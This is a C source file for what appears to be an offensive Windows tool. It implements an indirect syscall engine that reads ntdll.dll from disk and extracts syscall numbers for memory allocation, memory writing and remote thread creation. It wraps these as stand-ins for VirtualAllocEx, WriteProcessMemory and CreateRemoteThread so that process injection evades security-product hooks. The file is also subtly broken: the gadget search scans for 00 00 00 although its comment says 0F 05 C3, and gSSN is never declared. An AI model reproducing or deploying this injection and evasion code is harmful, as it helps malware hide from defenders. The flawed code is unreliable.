// engine.c
// Indirect syscall engine - supports NtAllocateVirtualMemory,
// NtWriteVirtualMemory, NtCreateThreadEx
//
// Clean ntdll from disk -> extract SSNs -> jump to ntdll's syscall;ret gadget

#include <windows.h>
#include <stdio.h>
#include "custom_valloc.h"

PVOID  gSyscallAddr = NULL;

// --- Per-function SSNs ---
static DWORD  g_SSN_AllocVM = 0;
static DWORD  g_SSN_WriteVM = 0;
static DWORD  g_SSN_CreateThread = 0;
static PVOID  g_pSyscallGadget = NULL;
static BOOL   g_Initialized = FALSE;

// Forward decl
static DWORD _rvaToRaw(PIMAGE_SECTION_HEADER sections, WORD count, DWORD rva);


static PVOID MapCleanNtdll(void)
{
    HANDLE hFile = CreateFileW(
        L"\\\\?\\C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open ntdll from disk: %lu\n", GetLastError());
        return NULL;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    PVOID pFile = HeapAlloc(GetProcessHeap(), 0, fileSize);
    if (!pFile) { CloseHandle(hFile); return NULL; }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, pFile, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        HeapFree(GetProcessHeap(), 0, pFile);
        CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);
    printf("[+] Mapped clean ntdll from disk (%lu bytes)\n", fileSize);
    return pFile;
}

// -------------------------------------------------------------------
// RVA to raw file offset
// -------------------------------------------------------------------
static DWORD _rvaToRaw(PIMAGE_SECTION_HEADER sections, WORD count, DWORD rva)
{
    for (WORD i = 0; i < count; i++) {
        if (rva >= sections[i].VirtualAddress &&
            rva < sections[i].VirtualAddress + sections[i].Misc.VirtualSize) {
            return rva - sections[i].VirtualAddress + sections[i].PointerToRawData;
        }
    }
    return rva;
}

// -------------------------------------------------------------------
// Extract SSN from clean ntdll PE exports
// -------------------------------------------------------------------
static BOOL ExtractSSN(PVOID pClean, const char* funcName, DWORD* outSSN)
{
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pClean;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pClean + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    DWORD exportRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportRVA == 0) return FALSE;

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    WORD nSec = pNt->FileHeader.NumberOfSections;

    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)pClean + _rvaToRaw(pSec, nSec, exportRVA));

    DWORD* pNames    = (DWORD*)((BYTE*)pClean + _rvaToRaw(pSec, nSec, pExp->AddressOfNames));
    WORD*  pOrdinals = (WORD*) ((BYTE*)pClean + _rvaToRaw(pSec, nSec, pExp->AddressOfNameOrdinals));
    DWORD* pFuncs    = (DWORD*)((BYTE*)pClean + _rvaToRaw(pSec, nSec, pExp->AddressOfFunctions));

    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)pClean + _rvaToRaw(pSec, nSec, pNames[i]));
        if (strcmp(name, funcName) == 0) {
            WORD ord = pOrdinals[i];
            DWORD funcRaw = _rvaToRaw(pSec, nSec, pFuncs[ord]);
            BYTE* pFunc = (BYTE*)pClean + funcRaw;

            // Pattern: 4C 8B D1 B8 XX XX 00 00
            if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1 && pFunc[3] == 0xB8) {
                *outSSN = *(DWORD*)(pFunc + 4);
                printf("[+] %s: SSN = 0x%X\n", funcName, *outSSN);
                return TRUE;
            }
            printf("[-] %s: non-standard stub: %02X %02X %02X %02X\n",
                funcName, pFunc[0], pFunc[1], pFunc[2], pFunc[3]);
            return FALSE;
        }
    }
    printf("[-] %s: not found in exports\n", funcName);
    return FALSE;
}

// -------------------------------------------------------------------
// Find "syscall; ret" (0F 05 C3) gadget in loaded ntdll .text
// -------------------------------------------------------------------
static PVOID FindSyscallGadget(void)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return NULL;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSec[i].Name, ".text", 5) == 0) {
            BYTE* pStart = (BYTE*)hNtdll + pSec[i].VirtualAddress;
            DWORD size = pSec[i].Misc.VirtualSize;
            for (DWORD j = 0; j < size - 2; j++) {
                if (pStart[j] == 0x00 && pStart[j+1] == 0x00 && pStart[j+2] == 0x00) {
                    printf("[+] syscall;ret gadget at: %p\n", &pStart[j]);
                    return &pStart[j];
                }
            }
        }
    }
    return NULL;
}

// -------------------------------------------------------------------
// Helper: set globals before each indirect syscall
// -------------------------------------------------------------------
static void SetSyscall(DWORD ssn)
{
    gSSN = ssn;
    gSyscallAddr = g_pSyscallGadget;
}

// -------------------------------------------------------------------
// Public API
// -------------------------------------------------------------------

BOOL InitSyscallEngine(void)
{
    if (g_Initialized) return TRUE;

    printf("[*] Initializing indirect syscall engine...\n");

    PVOID pClean = MapCleanNtdll();
    if (!pClean) return FALSE;

    BOOL ok = TRUE;
    ok &= ExtractSSN(pClean, "NtAllocateVirtualMemory", &g_SSN_AllocVM);
    ok &= ExtractSSN(pClean, "NtWriteVirtualMemory",    &g_SSN_WriteVM);
    ok &= ExtractSSN(pClean, "NtCreateThreadEx",         &g_SSN_CreateThread);

    HeapFree(GetProcessHeap(), 0, pClean);

    if (!ok) {
        printf("[-] Failed to extract one or more SSNs\n");
        return FALSE;
    }

    g_pSyscallGadget = FindSyscallGadget();
    if (!g_pSyscallGadget) return FALSE;

    g_Initialized = TRUE;
    printf("[+] Engine ready\n");
    printf("    NtAllocateVirtualMemory : 0x%X\n", g_SSN_AllocVM);
    printf("    NtWriteVirtualMemory    : 0x%X\n", g_SSN_WriteVM);
    printf("    NtCreateThreadEx        : 0x%X\n", g_SSN_CreateThread);
    printf("    Gadget                  : %p\n\n", g_pSyscallGadget);
    return TRUE;
}

LPVOID CustomVirtualAlloc(LPVOID lpAddr, SIZE_T dwSize, DWORD flType, DWORD flProtect)
{
    return CustomVirtualAllocEx((HANDLE)-1, lpAddr, dwSize, flType, flProtect);
}

LPVOID CustomVirtualAllocEx(HANDLE hProc, LPVOID lpAddr, SIZE_T dwSize, DWORD flType, DWORD flProtect)
{
    if (!g_Initialized) return NULL;

    SetSyscall(g_SSN_AllocVM);

    PVOID base = lpAddr;
    SIZE_T size = dwSize;
    NTSTATUS st = IndirectSyscall_NtAllocateVirtualMemory(hProc, &base, 0, &size, flType, flProtect);

    if (st >= 0) return base;
    printf("[-] NtAllocateVirtualMemory: 0x%08X\n", (unsigned int)st);
    return NULL;
}

BOOL CustomWriteProcessMemory(HANDLE hProc, LPVOID lpBase, LPCVOID lpBuf, SIZE_T nSize, SIZE_T* written)
{
    if (!g_Initialized) return FALSE;

    SetSyscall(g_SSN_WriteVM);

    SIZE_T bytesWritten = 0;
    NTSTATUS st = IndirectSyscall_NtWriteVirtualMemory(
        hProc, lpBase, (PVOID)lpBuf, nSize, &bytesWritten
    );

    if (written) *written = bytesWritten;

    if (st >= 0) return TRUE;
    printf("[-] NtWriteVirtualMemory: 0x%08X\n", (unsigned int)st);
    return FALSE;
}

HANDLE CustomCreateRemoteThread(HANDLE hProc, LPVOID lpStart, LPVOID lpParam)
{
    if (!g_Initialized) return NULL;

    SetSyscall(g_SSN_CreateThread);

    HANDLE hThread = NULL;
    NTSTATUS st = IndirectSyscall_NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,  // DesiredAccess
        NULL,               // ObjectAttributes
        hProc,              // ProcessHandle
        lpStart,            // StartRoutine
        lpParam,            // Argument
        0,                  // Flags (0 = run immediately)
        0,                  // ZeroBits
        0,                  // StackSize (default)
        0,                  // MaxStackSize (default)
        NULL                // AttributeList
    );

    if (st >= 0) return hThread;
    printf("[-] NtCreateThreadEx: 0x%08X\n", (unsigned int)st);
    return NULL;
}
